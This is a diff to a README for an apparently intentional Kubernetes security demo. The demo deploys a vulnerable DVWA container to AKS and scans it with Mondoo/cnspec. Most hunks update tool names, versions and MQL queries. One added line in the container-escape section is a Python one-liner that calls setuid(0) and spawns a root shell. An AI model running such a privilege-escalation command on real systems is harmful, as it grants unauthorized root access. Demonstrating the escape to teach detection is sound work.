@@ -158,7 +158,7 @@ Deploy the Mondoo Operator to the AKS cluster according the manual [https://mond
 At first deploy the cert-manager from [https://cert-manager.io/docs/installation/](https://cert-manager.io/docs/installation/):
 
 ```bash
-kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.9.1/cert-manager.yaml
+kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.11.0/cert-manager.yaml
 ```
 
 ### Deploy Mondoo Operator
@@ -422,6 +422,7 @@ chmod a+x ./priv-es
 Execute the script
 ```bash
 ./priv-es
+python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
 Show that you are now root on the container
@@ -518,25 +519,25 @@ ssh -o StrictHostKeyChecking=no -i new-ssh-key ubuntu@40.88.137.64
 ### Scan kubernetes manifest
 
 ```bash
-mondoo scan k8s --path ../assets/dvwa-deployment.yml
+cnspec scan k8s --path ../assets/dvwa-deployment.yml
 ```
 
 ### Scan container image from registry
 
 ```bash
-mondoo scan cr docker.io/pmuench/dvwa-container-escape:latest
+cnspec scan container docker.io/pmuench/dvwa-container-escape:latest
 ```
 
 ### Scan kubernetes aks cluster
 
 ```bash
-mondoo scan k8s
+cnspec scan k8s
 ```
 
 ### Shell to kubernetes aks cluster
 
 ```bash
-mondoo shell -t k8s
+cnspec shell k8s
 ```
 
 List all of the pods and all of their settings:
@@ -557,58 +558,46 @@ Use MQL to search for configuration across your cluster such as "are containers 
 k8s.pods { _.containers { image containerImage { identifierType == "digest" } } }
 ```
 
-You can also just turn that into an assertion where you expect that all containers use `digest` for `identifierType`:
-
-```bash
-k8s.pods.all( _.containers { image containerImage { identifierType == "digest" } })
-```
-
 You can also use a `where` clause and just turn that into a list and filter the results:
 
 ```bash
 k8s.pods.where( _.containers { image containerImage { identifierType != "digest" } })
 ```
 
-You can quick check the securityContext of your clusters to see if `allowPrivilegeEscalation` is set to `true`:
+You can quick check the securityContext of your clusters to see if `privileged` is set to `true`:
 
 ```bash
 k8s.pods { containers { name securityContext } }
 ```
 
-Turn it into an assertion:
-
-```bash
-k8s.pods.none(containers { securityContext['allowPrivilegeEscalation'] == true })
-```
-
 Get the list of pods that fail:
 
 ```bash
-k8s.pods.where(containers { securityContext['allowPrivilegeEscalation'] != true })
+k8s.pods.none(containers { securityContext['privileged'] == true })
 ```
 
 ### Scan a azure subscription
 
 ```bash
-mondoo scan azure --subscription {subscriptionID}
+cnspec scan azure --subscription {subscriptionID}
 ```
 
 ### Shell to azure subscription
 
 ```bash
-mondoo shell -t az --option subscriptionID={subscriptionID}
+cnspec shell azure --subscription {subscriptionID}
 ```
 
 List Azure VMs
 
 ```bash
-azurerm.compute.vms { * }
+azure.compute.vms { * }
 ```
 
 Get access policies of all vaults
 
 ```bash
-azurerm.keyvault.vaults { vaultName properties }
+azure.keyvault.vaults { vaultName properties }
 ```
 
 ## Destroy the cluster
